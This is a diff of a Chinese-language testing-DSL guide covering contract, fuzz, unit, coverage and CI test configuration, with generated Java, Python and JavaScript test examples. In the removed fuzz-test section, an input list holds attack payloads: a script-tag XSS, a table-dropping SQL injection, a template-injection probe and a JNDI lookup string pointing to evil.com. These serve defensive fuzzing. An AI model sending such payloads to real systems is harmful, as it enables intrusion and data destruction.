-        target: "result"
-        expected: "{{expected}}"
-      }
-    ]
-  }
-}
-```
-
-### 3.3 契约测试 (Contract Testing)
-
-```dsl
-contract_test UserServiceContract {
-  framework: "pact"
-  provider: "user-service"
-  consumer: "order-service"
-  
-  contracts: [
-    {
-      name: "get_user_by_id"
-      description: "根据ID获取用户信息"
-      request: {
-        method: "GET"
-        path: "/api/users/{id}"
-        headers: {
-          "Accept": "application/json"
-        }
-        path_params: {
-          id: "123"
-        }
-      }
-      response: {
-        status: 200
-        headers: {
-          "Content-Type": "application/json"
-        }
-        body: {
-          id: "123"
-          username: "testuser"
-          email: "test@example.com"
-          status: "active"
-        }
-      }
-    },
-    {
-      name: "create_user"
-      description: "创建新用户"
-      request: {
-        method: "POST"
-        path: "/api/users"
-        headers: {
-          "Content-Type": "application/json"
-        }
-        body: {
-          username: "newuser"
-          email: "new@example.com"
-          password: "password123"
-        }
-      }
-      response: {
-        status: 201
-        headers: {
-          "Content-Type": "application/json"
-        }
-        body: {
-          id: "456"
-          username: "newuser"
-          email: "new@example.com"
-          status: "active"
-        }
-      }
-    }
-  ]
-}
-```
-
-### 3.4 模糊测试 (Fuzz Testing)
-
-```dsl
-fuzz_test InputValidationFuzzTest {
-  framework: "afl"
-  
-  test_targets: [
-    {
-      name: "user_input_validation"
-      binary: "./user_validator"
-      input_directory: "./fuzz_inputs"
-      output_directory: "./fuzz_outputs"
-      dictionary: "./fuzz_dictionary.txt"
-    }
-  ]
-  
-  fuzz_strategies: [
-    {
-      name: "boundary_values"
-      inputs: [
-        "",
-        "a" * 1000,
-        "null",
-        "undefined",
-        "NaN",
-        "Infinity"
-      ]
-    },
-    {
-      name: "special_characters"
-      inputs: [
-        "<script>alert('xss')</script>",
-        "'; DROP TABLE users; --",
-        "{{7*7}}",
-        "${jndi:ldap://evil.com/exploit}"
-      ]
-    },
-    {
-      name: "unicode_characters"
-      inputs: [
-        "测试用户",
-        "🚀🚀🚀",
-        "café",
-        "über"
-      ]
-    }
-  ]
-  
-  crash_analysis: {
-    enabled: true
-    min_crash_size: 10
-    deduplication: true
-  }
-}
-```
-
-## 4. 自动化代码生成
-
-### 4.1 Java JUnit 测试生成
-
-```dsl
-generate_java_tests UserService {
-  framework: "junit5"
-  patterns: [
-    "unit_test",
-    "integration_test"
-  ]
-  output: {
-    directory: "src/test/java"
-    package: "com.example.userservice.test"
-  }
-}
-```
-
-生成的代码示例：
-
-```java
-@ExtendWith(MockitoExtension.class)
-class UserServiceTest {
-    
-    @Mock
-    private UserRepository userRepository;
-    
-    @Mock
-    private PasswordEncoder passwordEncoder;
-    
-    @InjectMocks
-    private UserService userService;
-    
-    @Test
-    @DisplayName("测试用户创建成功")
-    void testCreateUserSuccess() {
-        // Given
-        UserCreateRequest request = new UserCreateRequest(
-            "testuser", "test@example.com", "password123"
-        );
-        
-        when(userRepository.findByUsername("testuser"))
-            .thenReturn(Optional.empty());
-        when(passwordEncoder.encode("password123"))
-            .thenReturn("encoded_password");
-        when(userRepository.save(any(User.class)))
-            .thenReturn(new User(1L, "testuser", "test@example.com"));
-        
-        // When
-        User result = userService.createUser(request);
-        
-        // Then
-        assertThat(result).isNotNull();
-        assertThat(result.getUsername()).isEqualTo("testuser");
-        verify(userRepository, times(1)).save(any(User.class));
-    }
-    
-    @Test
-    @DisplayName("测试创建重复用户名失败")
-    void testCreateUserDuplicateUsername() {
-        // Given
-        UserCreateRequest request = new UserCreateRequest(
-            "existinguser", "test@example.com", "password123"
-        );
-        
-        when(userRepository.findByUsername("existinguser"))
-            .thenReturn(Optional.of(new User(1L, "existinguser", "test@example.com")));
-        
-        // When & Then
-        assertThatThrownBy(() -> userService.createUser(request))
-            .isInstanceOf(UserAlreadyExistsException.class)
-            .hasMessage("用户名已存在");
-    }
-}
-```
-
-### 4.2 Python Pytest 测试生成
-
-```dsl
-generate_python_tests UserService {
-  framework: "pytest"
-  patterns: [
-    "unit_test",
-    "data_driven_test"
-  ]
-  output: {
-    directory: "tests"
-    module: "user_service"
-  }
-}
-```
-
-生成的代码示例：
-
-```python
-import pytest
-from unittest.mock import Mock, patch
-from user_service import UserService, UserAlreadyExistsException
-
-class TestUserService:
-    
-    @pytest.fixture
-    def user_repository(self):
-        return Mock()
-    
-    @pytest.fixture
-    def password_encoder(self):
-        return Mock()
-    
-    @pytest.fixture
-    def user_service(self, user_repository, password_encoder):
-        return UserService(user_repository, password_encoder)
-    
-    def test_create_user_success(self, user_service, user_repository, password_encoder):
-        # Given
-        request = {
-            "username": "testuser",
-            "email": "test@example.com",
-            "password": "password123"
-        }
-        
-        user_repository.find_by_username.return_value = None
-        password_encoder.encode.return_value = "encoded_password"
-        user_repository.save.return_value = {
-            "id": 1,
-            "username": "testuser",
-            "email": "test@example.com"
-        }
-        
-        # When
-        result = user_service.create_user(request)
-        
-        # Then
-        assert result is not None
-        assert result["username"] == "testuser"
-        user_repository.save.assert_called_once()
-    
-    def test_create_user_duplicate_username(self, user_service, user_repository):
-        # Given
-        request = {
-            "username": "existinguser",
-            "email": "test@example.com",
-            "password": "password123"
-        }
-        
-        user_repository.find_by_username.return_value = {
-            "id": 1,
-            "username": "existinguser",
-            "email": "test@example.com"
-        }
-        
-        # When & Then
-        with pytest.raises(UserAlreadyExistsException) as exc_info:
-            user_service.create_user(request)
-        
-        assert str(exc_info.value) == "用户名已存在"
-
-@pytest.mark.parametrize("username,email,password,expected_result", [
-    ("validuser", "valid@example.com", "password123", "valid"),
-    ("", "invalid-email", "123", "invalid"),
-    ("user@", "test@", "pass", "invalid"),
-])
-def test_user_validation(username, email, password, expected_result):
-    result = UserService.validate_user(username, email, password)
-    assert result == expected_result
-```
-
-### 4.3 JavaScript Jest 测试生成
-
-```dsl
-generate_javascript_tests UserService {
-  framework: "jest"
-  patterns: [
-    "unit_test",
-    "integration_test"
-  ]
-  output: {
-    directory: "tests"
-    module: "user-service"
-  }
-}
-```
-
-生成的代码示例：
-
-```javascript
-const UserService = require('../src/user-service');
-const UserRepository = require('../src/user-repository');
-const PasswordEncoder = require('../src/password-encoder');
-
-jest.mock('../src/user-repository');
-jest.mock('../src/password-encoder');
-
-describe('UserService', () => {
-    let userService;
-    let userRepository;
-    let passwordEncoder;
-    
-    beforeEach(() => {
-        userRepository = new UserRepository();
-        passwordEncoder = new PasswordEncoder();
-        userService = new UserService(userRepository, passwordEncoder);
-    });
-    
-    describe('createUser', () => {
-        it('should create user successfully', async () => {
-            // Given
-            const request = {
-                username: 'testuser',
-                email: 'test@example.com',
-                password: 'password123'
-            };
-            
-            userRepository.findByUsername.mockResolvedValue(null);
-            passwordEncoder.encode.mockResolvedValue('encoded_password');
-            userRepository.save.mockResolvedValue({
-                id: 1,
-                username: 'testuser',
-                email: 'test@example.com'
-            });
-            
-            // When
-            const result = await userService.createUser(request);
-            
-            // Then
-            expect(result).toBeDefined();
-            expect(result.username).toBe('testuser');
-            expect(userRepository.save).toHaveBeenCalledTimes(1);
-        });
-        
-        it('should throw error for duplicate username', async () => {
-            // Given
-            const request = {
-                username: 'existinguser',
-                email: 'test@example.com',
-                password: 'password123'
-            };
-            
-            userRepository.findByUsername.mockResolvedValue({
-                id: 1,
-                username: 'existinguser',
-                email: 'test@example.com'
-            });
-            
-            // When & Then
-            await expect(userService.createUser(request))
-                .rejects
-                .toThrow('用户名已存在');
-        });
-    });
-});
-```
-
-## 5. 测试覆盖率分析
-
-### 5.1 代码覆盖率配置
-
-```dsl
-coverage_analysis UserService {
-  framework: "jacoco"
-  targets: [
-    "src/main/java/com/example/userservice"
-  ]
-  exclusions: [
-    "**/dto/**",
-    "**/config/**",
-    "**/exception/**"
-  ]
-  thresholds: {
-    line_coverage: 0.8
-    branch_coverage: 0.7
-    method_coverage: 0.9
-    class_coverage: 0.95
-  }
-  reports: [
-    "html",
-    "xml",
-    "csv"
-  ]
-  quality_gates: {
-    fail_on_violation: true
-    coverage_trend: "maintain"
-  }
-}
-```
-
-### 5.2 覆盖率报告生成
-
-```dsl
-generate_coverage_report UserService {
-  type: "html"
-  output_directory: "reports/coverage"
-  include: [
-    "line_coverage",
-    "branch_coverage",
-    "method_coverage",
-    "class_coverage"
-  ]
-  exclude: [
-    "generated_code",
-    "test_code"
-  ]
-  visualization: {
-    charts: [
-      "coverage_trend",
-      "coverage_by_package",
-      "coverage_by_class"
-    ]
-    thresholds: {
-      excellent: 0.9
-      good: 0.8
-      acceptable: 0.7
-      poor: 0.6
-    }
-  }
-}
-```
-
-## 6. 测试报告和分析
-
-### 6.1 测试报告配置
-
-```dsl
-test_reporting UserService {
-  framework: "allure"
-  output_directory: "reports/allure"
-  
-  report_types: [
-    "html",
-    "json",
-    "xml"
-  ]
-  
-  metrics: [
-    "total_tests",
-    "passed_tests",
-    "failed_tests",
-    "skipped_tests",
-    "execution_time",
-    "success_rate"
-  ]
-  
-  attachments: [
-    "screenshots",
-    "logs",
-    "videos",
-    "har_files"
-  ]
-  
-  trends: {
-    enabled: true
-    history_size: 30
-    metrics: [
-      "success_rate",
-      "execution_time",
-      "coverage"
-    ]
-  }
-}
-```
-
-### 6.2 测试分析配置
-
-```dsl
-test_analysis UserService {
-  flaky_test_detection: {
-    enabled: true
-    min_runs: 5
-    failure_threshold: 0.3
-  }
-  
-  test_optimization: {
-    parallel_execution: true
-    max_parallel_tests: 4
-    test_prioritization: true
-    priority_criteria: [
-      "failure_rate",
-      "execution_time",
-      "business_criticality"
-    ]
-  }
-  
-  test_maintenance: {
-    unused_test_detection: true
-    duplicate_test_detection: true
-    test_dependency_analysis: true
-  }
-}
-```
-
-## 7. 持续集成配置
-
-### 7.1 Jenkins Pipeline
-
-```dsl
-ci_pipeline UserService {
-  tool: "jenkins"
-  
-  stages: [
-    {
-      name: "checkout"
-      steps: [
-        "git checkout main",
-        "git pull origin main"
-      ]
-    },
-    {
-      name: "build"
-      steps: [
-        "mvn clean compile"
-      ]
-    },
+  test_suites: [
     {
       name: "unit_tests"
-      steps: [
-        "mvn test"
-      ]
-      post_actions: [
-        "publish_junit_results",
-        "publish_coverage_report"
+      description: "单元测试套件"
+      category: "unit"
+      
+      test_cases: [
+        {
+          name: "product_calculator_tests"
+          description: "产品计算器测试"
+          test_cases: [
+            "calculate_price_with_discount",
+            "calculate_tax",
+            "calculate_shipping"
+          ]
+        },
+        {
+          name: "user_validator_tests"
+          description: "用户验证器测试"
+          test_cases: [
+            "validate_email_format",
+            "validate_password_strength",
+            "validate_phone_number"
+          ]
+        }
       ]
     },
     {
       name: "integration_tests"
-      steps: [
-        "mvn verify -Pintegration"
-      ]
-      post_actions: [
-        "publish_test_results"
+      description: "集成测试套件"
+      category: "integration"
+      
+      test_cases: [
+        {
+          name: "api_integration_tests"
+          description: "API集成测试"
+          test_cases: [
+            "user_management_api",
+            "product_catalog_api",
+            "order_management_api"
+          ]
+        },
+        {
+          name: "database_integration_tests"
+          description: "数据库集成测试"
+          test_cases: [
+            "user_repository_tests",
+            "product_repository_tests",
+            "order_repository_tests"
+          ]
+        }
       ]
     },
     {
-      name: "security_tests"
-      steps: [
-        "mvn verify -Psecurity"
+      name: "e2e_tests"
+      description: "端到端测试套件"
+      category: "e2e"
+      
+      test_cases: [
+        {
+          name: "user_journey_tests"
+          description: "用户旅程测试"
+          test_cases: [
+            "user_registration_flow",
+            "product_browsing_flow",
+            "purchase_flow"
+          ]
+        }
       ]
     },
     {
       name: "performance_tests"
-      steps: [
-        "jmeter -n -t performance/load_test.jmx"
-      ]
-      post_actions: [
-        "publish_performance_report"
-      ]
-    }
-  ]
-  
-  quality_gates: {
-    unit_test_success_rate: 0.95
-    integration_test_success_rate: 0.9
-    coverage_threshold: 0.8
-    security_vulnerabilities: 0
-  }
-}
-```
-
-### 7.2 GitHub Actions
-
-```dsl
-github_actions UserService {
-  triggers: [
-    "push",
-    "pull_request"
-  ]
-  
-  jobs: [
-    {
-      name: "test"
-      runs_on: "ubuntu-latest"
-      steps: [
+      description: "性能测试套件"
+      category: "performance"
+      
+      test_cases: [
         {
-          name: "Checkout code"
-          uses: "actions/checkout@v3"
+          name: "load_tests"
+          description: "负载测试"
+          test_cases: [
+            "api_load_test",
+            "database_load_test"
+          ]
         },
         {
-          name: "Setup Java"
-          uses: "actions/setup-java@v3"
-          with: {
-            java-version: "17"
-            distribution: "temurin"
-          }
-        },
-        {
-          name: "Run tests"
-          run: "mvn test"
-        },
-        {
-          name: "Upload coverage"
-          uses: "codecov/codecov-action@v3"
+          name: "stress_tests"
+          description: "压力测试"
+          test_cases: [
+            "api_stress_test",
+            "database_stress_test"
+          ]
         }
       ]
     },
     {
-      name: "security-scan"
-      runs_on: "ubuntu-latest"
-      steps: [
+      name: "security_tests"
+      description: "安全测试套件"
+      category: "security"
+      
+      test_cases: [
         {
-          name: "Run OWASP ZAP"
-          uses: "zaproxy/action-full-scan@v0.7.0"
-          with: {
-            target: "https://example.com"
-          }
+          name: "authentication_tests"
+          description: "认证测试"
+          test_cases: [
+            "sql_injection_test",
+            "xss_test",
+            "csrf_test"
+          ]
+        },
+        {
+          name: "authorization_tests"
+          description: "授权测试"
+          test_cases: [
+            "unauthorized_access_test",
+            "privilege_escalation_test"
+          ]
         }
       ]
     }
   ]
-}
-```
-
-## 8. 测试环境管理
-
-### 8.1 测试环境配置
-
-```dsl
-test_environment UserService {
-  environments: [
+  
+  test_environments: [
     {
-      name: "unit_test"
+      name: "unit_test_env"
+      description: "单元测试环境"
       type: "local"
-      dependencies: [
-        "jdk17",
-        "maven"
-      ]
+      setup: "setup_unit_test_env"
+      teardown: "cleanup_unit_test_env"
     },
     {
-      name: "integration_test"
+      name: "integration_test_env"
+      description: "集成测试环境"
       type: "docker"
-      services: [
-        {
-          name: "postgres"
-          image: "postgres:14"
-          environment: {
-            POSTGRES_DB: "testdb"
-            POSTGRES_USER: "testuser"
-            POSTGRES_PASSWORD: "testpass"
-          }
-          ports: ["5432:5432"]
-        },
-        {
-          name: "redis"
-          image: "redis:7"
-          ports: ["6379:6379"]
-        }
-      ]
+      setup: "start_integration_services"
+      teardown: "stop_integration_services"
     },
     {
-      name: "e2e_test"
-      type: "kubernetes"
-      namespace: "test-e2e"
-      resources: [
-        {
-          name: "user-service"
-          replicas: 2
-          resources: {
-            requests: {
-              cpu: "100m"
-              memory: "128Mi"
-            }
-          }
-        }
-      ]
+      name: "e2e_test_env"
+      description: "端到端测试环境"
+      type: "staging"
+      setup: "deploy_to_staging"
+      teardown: "cleanup_staging"
     }
   ]
   
-  data_management: {
-    fixtures: [
-      {
-        name: "test_users"
-        file: "fixtures/users.json"
-        tables: ["users"]
-      },
-      {
-        name: "test_products"
-        file: "fixtures/products.json"
-        tables: ["products"]
-      }
-    ]
-    
-    cleanup: {
-      strategy: "truncate"
-      tables: ["users", "products", "orders"]
-    }
-  }
-}
-```
-
-## 9. 测试数据管理
-
-### 9.1 测试数据生成
-
-```dsl
-test_data_generation UserService {
-  generators: [
+  test_data: [
     {
-      name: "user_data"
-      type: "faker"
-      locale: "zh_CN"
-      fields: [
-        {
-          name: "username"
-          type: "userName"
-          unique: true
-        },
-        {
-          name: "email"
-          type: "email"
-          unique: true
-        },
-        {
-          name: "password"
-          type: "password"
-          min_length: 8
-          max_length: 20
-        },
-        {
-          name: "phone"
-          type: "phoneNumber"
-        }
-      ]
-      count: 100
+      name: "user_test_data"
+      description: "用户测试数据"
+      type: "csv"
+      file: "test_data/users.csv"
+      columns: ["id", "name", "email", "password"]
     },
     {
-      name: "order_data"
-      type: "template"
-      template: {
-        userId: "{{random_int(1,100)}}"
-        items: [
-          {
-            productId: "{{random_int(1,50)}}"
-            quantity: "{{random_int(1,5)}}"
-          }
-        ]
-        status: "{{random_choice(['pending','confirmed','shipped'])}}"
-      }
-      count: 50
+      name: "product_test_data"
+      description: "产品测试数据"
+      type: "json"
+      file: "test_data/products.json"
     }
   ]
   
-  data_sets: [
-    {
-      name: "happy_path"
-      description: "正常流程测试数据"
-      data: {
-        valid_user: {
-          username: "testuser"
-          email: "test@example.com"
-          password: "password123"
-        }
-      }
-    },
-    {
-      name: "edge_cases"
-      description: "边界条件测试数据"
-      data: {
-        empty_username: {
-          username: ""
-          email: "test@example.com"
-          password: "password123"
-        },
-        long_username: {
-          username: "a" * 100
-          email: "test@example.com"
-          password: "password123"
-        }
-      }
-    }
-  ]
-}
-```
-
-## 10. 测试监控和告警
-
-### 10.1 测试执行监控
-
-```dsl
-test_monitoring UserService {
-  metrics: [
-    {
-      name: "test_execution_time"
-      type: "histogram"
-      labels: ["test_suite", "test_case"]
-    },
-    {
-      name: "test_success_rate"
-      type: "gauge"
-      labels: ["test_suite"]
-    },
-    {
-      name: "test_failure_count"
-      type: "counter"
-      labels: ["test_suite", "failure_type"]
-    }
-  ]
-  
-  alerts: [
-    {
-      name: "high_test_failure_rate"
-      condition: "test_success_rate < 0.9"
-      duration: "5m"
-      severity: "warning"
-    },
-    {
-      name: "test_execution_timeout"
-      condition: "test_execution_time > 300s"
-      duration: "1m"
-      severity: "critical"
-    }
-  ]
-  
-  dashboards: [
-    {
-      name: "test_overview"
-      panels: [
-        {
-          title: "Test Success Rate"
-          type: "gauge"
-          query: "test_success_rate"
-        },
-        {
-          title: "Test Execution Time"
-          type: "line"
-          query: "test_execution_time"
-        }
-      ]
-    }
-  ]
-}
-```
-
-## 11. 最佳实践和模式组合
-
-### 11.1 测试金字塔模式
-
-```dsl
-test_pyramid UserService {
-  unit_tests: {
-    percentage: 70
-    execution_time: "< 1s"
-    coverage: "> 90%"
-    framework: "junit5"
-  }
-  
-  integration_tests: {
-    percentage: 20
-    execution_time: "< 30s"
-    coverage: "> 80%"
-    framework: "spring_boot_test"
-  }
-  
-  e2e_tests: {
-    percentage: 10
-    execution_time: "< 5m"
-    coverage: "> 60%"
-    framework: "selenium"
-  }
-  
-  automation_levels: [
-    {
-      level: "unit"
-      automation: 100
-      manual: 0
-    },
-    {
-      level: "integration"
-      automation: 90
-      manual: 10
-    },
-    {
-      level: "e2e"
-      automation: 80
-      manual: 20
-    }
-  ]
-}
-```
-
-### 11.2 行为驱动开发 (BDD)
-
-```dsl
-bdd_scenarios UserService {
-  framework: "cucumber"
-  
-  features: [
-    {
-      name: "User Registration"
-      description: "用户注册功能"
-      scenarios: [
-        {
-          name: "Successful Registration"
-          given: "用户访问注册页面"
-          when: "用户填写有效信息并提交"
-          then: "用户应成功注册并收到确认邮件"
-        },
-        {
-          name: "Registration with Invalid Email"
-          given: "用户访问注册页面"
-          when: "用户填写无效邮箱地址并提交"
-          then: "系统应显示邮箱格式错误"
-        }
-      ]
-    }
-  ]
-  
-  step_definitions: {
-    language: "java"
-    package: "com.example.steps"
-  }
-  
-  reports: {
+  reporting: {
     format: "html"
-    output: "reports/cucumber"
+    output_dir: "test_reports"
+    include_screenshots: true
+    include_logs: true
   }
 }
 ```
 
-## 12. 与主流标准的映射
+## 工具链支持
 
-### 12.1 测试框架标准
+### 开发工具
 
-- **JUnit 5**: 自动生成 @Test、@DisplayName、@ParameterizedTest
-- **Pytest**: 自动生成 test_* 函数、@pytest.mark.parametrize
-- **Jest**: 自动生成 describe、it、expect 结构
-- **Cucumber**: 自动生成 Feature、Scenario、Step Definitions
-
-### 12.2 持续集成标准
-
-- **Jenkins**: 自动生成 Jenkinsfile、Pipeline 脚本
-- **GitHub Actions**: 自动生成 .github/workflows 配置
-- **GitLab CI**: 自动生成 .gitlab-ci.yml 配置
-- **Azure DevOps**: 自动生成 azure-pipelines.yml 配置
-
-### 12.3 测试报告标准
-
-- **Allure**: 自动生成 HTML 报告、趋势分析
-- **JaCoCo**: 自动生成覆盖率报告、质量门禁
-- **SonarQube**: 自动生成代码质量报告、测试覆盖率
-- **TestNG**: 自动生成 XML 报告、HTML 报告
-
-## 13. 递归扩展建议
-
-### 13.1 测试用例自动生成
-
-```dsl
-auto_test_generation UserService {
-  source: {
-    type: "code_analysis"
-    target: "src/main/java/com/example/userservice"
-  }
-  
-  strategies: [
-    {
-      name: "method_coverage"
-      approach: "generate_tests_for_all_methods"
-    },
-    {
-      name: "branch_coverage"
-      approach: "generate_tests_for_all_branches"
-    },
-    {
-      name: "boundary_testing"
-      approach: "generate_boundary_value_tests"
-    }
-  ]
-  
-  templates: [
-    {
-      name: "happy_path"
-      pattern: "test_successful_operation"
-    },
-    {
-      name: "error_handling"
-      pattern: "test_error_scenarios"
-    },
-    {
-      name: "edge_cases"
-      pattern: "test_boundary_conditions"
-    }
-  ]
-}
+```yaml
+# 开发工具
+development_tools:
+  dsl_editor:
+    features:
+      - "语法高亮"
+      - "自动补全"
+      - "语法检查"
+      - "实时预览"
+    tools:
+      - "VS Code Extension"
+      - "IntelliJ Plugin"
+      - "Web-based Editor"
+      
+  validation_tool:
+    features:
+      - "语法验证"
+      - "逻辑验证"
+      - "依赖检查"
+      - "覆盖率分析"
+    tools:
+      - "DSL Validator"
+      - "Test Validator"
+      - "Coverage Analyzer"
+      
+  testing_tool:
+    features:
+      - "测试执行"
+      - "测试报告"
+      - "测试监控"
+      - "测试分析"
+    tools:
+      - "DSL Test Runner"
+      - "Test Report Generator"
+      - "Test Monitor"
 ```
 
-### 13.2 智能测试优化
+### 执行引擎
 
-```dsl
-intelligent_test_optimization UserService {
-  test_selection: {
-    strategy: "impact_analysis"
-    criteria: [
-      "code_changes",
-      "failure_history",
-      "execution_time",
-      "business_criticality"
-    ]
-  }
-  
-  test_prioritization: {
-    algorithm: "machine_learning"
-    features: [
-      "historical_failure_rate",
-      "code_complexity",
-      "execution_frequency",
-      "dependency_graph"
-    ]
-  }
-  
-  test_maintenance: {
-    duplicate_detection: true
-    obsolete_test_removal: true
-    test_refactoring_suggestions: true
-  }
-}
+```yaml
+# 执行引擎
+execution_engine:
+  core_components:
+    - name: "Parser"
+      description: "DSL解析器"
+      features:
+        - "语法解析"
+        - "语义分析"
+        - "错误报告"
+        
+    - name: "Test Runner"
+      description: "测试执行器"
+      features:
+        - "测试执行"
+        - "并行处理"
+        - "错误处理"
+        
+    - name: "Report Generator"
+      description: "报告生成器"
+      features:
+        - "测试报告"
+        - "覆盖率报告"
+        - "性能报告"
+        
+    - name: "Test Monitor"
+      description: "测试监控器"
+      features:
+        - "执行监控"
+        - "性能监控"
+        - "告警管理"
 ```
 
-这个扩展后的测试模型DSL提供了：
+## 最佳实践
 
-1. **详细的语法定义**：涵盖单元测试、集成测试、端到端测试、性能测试、安全测试
-2. **高级特性**：数据驱动测试、参数化测试、契约测试、模糊测试
-3. **自动化代码生成**：支持Java、Python、JavaScript等多语言框架
-4. **测试覆盖率分析**：代码覆盖率配置和报告生成
-5. **测试报告和分析**：测试报告配置和测试分析
-6. **持续集成配置**：Jenkins Pipeline和GitHub Actions配置
-7. **测试环境管理**：测试环境配置和数据管理
-8. **测试数据管理**：测试数据生成和管理
-9. **测试监控和告警**：测试执行监控和告警配置
-10. **最佳实践**：测试金字塔模式和BDD模式
-11. **标准映射**：与主流测试框架和CI/CD标准对接
-12. **递归扩展**：测试用例自动生成和智能测试优化
+### 设计最佳实践
+
+1. **测试驱动开发**：先写测试，再写代码
+2. **测试金字塔**：单元测试 > 集成测试 > 端到端测试
+3. **测试隔离**：每个测试应该独立运行
+4. **测试数据管理**：使用专门的测试数据
+
+### 实施最佳实践
+
+1. **自动化测试**：尽可能自动化所有测试
+2. **持续集成**：在CI/CD中集成测试
+3. **测试覆盖率**：保持高测试覆盖率
+4. **测试维护**：定期维护和更新测试
+
+### 维护最佳实践
+
+1. **测试文档**：保持测试文档的更新
+2. **测试审查**：定期审查测试质量
+3. **性能监控**：监控测试执行性能
+4. **测试优化**：持续优化测试效率
+
+## 相关概念
+
+- [测试建模理论](theory.md)
+
+## 参考文献
+
+1. Beck, K. (2002). "Test Driven Development"
+2. Martin, R. C. (2008). "Clean Code"
+3. Fowler, M. (2018). "Refactoring: Improving the Design of Existing Code"
+4. Meszaros, G. (2007). "xUnit Test Patterns"
+5. Adzic, G. (2011). "Specification by Example"
